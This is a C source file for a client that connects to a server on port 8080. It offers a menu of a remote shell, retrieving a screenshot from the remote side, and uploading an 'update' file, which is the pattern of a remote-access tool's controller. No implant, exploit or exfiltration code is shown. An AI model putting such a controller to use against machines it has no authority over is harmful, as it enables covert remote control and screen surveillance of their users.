//FILE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

//NETWORK
#include<sys/socket.h>
#include<arpa/inet.h>
#include <netdb.h>

//UTIL
#include<stdio.h>
#include<string.h>
#include <stdlib.h>
#include <unistd.h>

extern int h_errno;

#define BUF_SIZE 255
#define PORT 8080
#define SCREEN_FILE "screenshot.png"
#define UPDATE_FILE "update"


// READ A LINE FORM STANDARD INPUT
char* read_input() {
	char* in =  malloc(sizeof(char) * BUF_SIZE);
	if (fgets(in, BUF_SIZE, stdin) == NULL)
		exit(1);
	return in;
}


// COPY DATA FROM INPUT DESCRIPTOR TO OUTPUT DESCRIPTOR
int copy(int output_fd, int input_fd)
{
	char buffer[BUF_SIZE];
	int n = 0;
	while((n = read(input_fd, buffer, BUF_SIZE)) > 0)
		if(write(output_fd, buffer , n) < 0){
			perror("copy");
			exit(1);
		}
	return 1;
}


/* CREATE ONE PROCESS:
 *	- CHILD READ INPUT FROM USER ADN SEND IT TO SERVER
 *	- PARENT READ INPUT FROM SERVER AND OUTPUT TO STANDARD OUTPUT
 */
void handle_shell(int socket) {
	if(fork() == 0){
		char car;
		while(1) {
			//READ AND WRITE 1 CHAR FOR AUTO-COMPLETION
			read(0, &car, sizeof(char));
			write(socket, &car, sizeof(char));
		}
	} else {
		FILE *file = fdopen(socket, "r");
		char buf[BUF_SIZE];
		while(fgets(buf, BUF_SIZE, file) != NULL){
			printf("%s", buf);
			fflush(stdout);
		}
		exit(1);
	}
}

// OPEN SCREEN_FILE AND WRITE IN DATA FROM SOCKET
void get_screenshot(int socket){
	int fd = open(SCREEN_FILE, O_CREAT | O_WRONLY | O_RDONLY, 0666);
	if(fd < 0){
		perror(SCREEN_FILE);
		exit(1);
	}
	copy(fd, socket);
	close(fd);
}


// OPEN UPDATE_FILE AND SEND IT THROUGH SOCKET
void send_update(int socket){
	int fd = open(UPDATE_FILE, O_RDONLY);
	if(fd < 0){
		perror(UPDATE_FILE);
		exit(1);
	}
	copy(socket, fd);	
	close(fd);
}


// INTERACT WITH USER AND SERVER IN ORDER TO CHOOSE ACTION
void interact(int socket) {
	printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n3: UPDATE\n---FIN---\n");
	
	char *input;
	int choix = 0; 
	int i;
	// GET INPUT FROM USER AND TRANSFORM IT TO AN INT
	while(choix == 0) {
		input = read_input();
		for(i = 0; i < 4; i++)
			if(strchr(input, i + '0') != NULL)
				choix = i;
	}
	// TELL TO SERVER OUR CHOICE			
	write(socket, input, BUF_SIZE); 
	free(input); 
	
	switch(choix) {
		case 1 : 
			handle_shell(socket);
		break;
		case 2: 
			get_screenshot(socket);
		break;
		case 3:
			send_update(socket);
		break;
	}
	// WE'RE DONE, BYE
	close(socket);
}


// RETURN A FILE DESCRIPTOR ASSOCIATED TO SERVER
int connect_to_server(char *hostname){
	int socket_desc;
	struct sockaddr_in server;

	//CREATE SOCKET
	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
	if (socket_desc == -1)
	{
		printf("Could not create socket");
		exit(1);
	}
	//GET ADRESS FROM HOSTNAME
	struct hostent *he = gethostbyname(hostname);	
	memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);	
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);

	//CONNECT TO REMOTE SERVER
	if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		perror("connect error");
		exit(1);
	}
	printf("Connected\n");
	return socket_desc;
}

int main(int argc, char **argv) {
	char *host;
	if(argc > 1)
		host = argv[1];
	else
		host = "localhost";
	interact(connect_to_server(host));   
	return 0;
}
